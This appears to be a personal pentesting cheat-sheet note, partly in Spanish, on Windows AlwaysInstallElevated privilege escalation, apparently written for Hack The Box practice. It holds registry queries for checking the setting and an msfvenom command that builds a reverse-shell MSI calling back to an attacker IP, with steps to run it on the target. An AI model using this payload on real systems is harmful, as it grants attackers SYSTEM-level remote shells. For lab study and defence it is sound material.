## DESCRIPTION

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\**SYSTEM**.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![[Pasted image 20230629205600.png]]
#### Mas información
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated


## EXPLOITATION

1. Creamos una reverse shell .msi

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=4444 -f msi -o shell.msi 
```

2. La transferimos a la maquina y ejecutamos

![[Pasted image 20230629210004.png]]

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 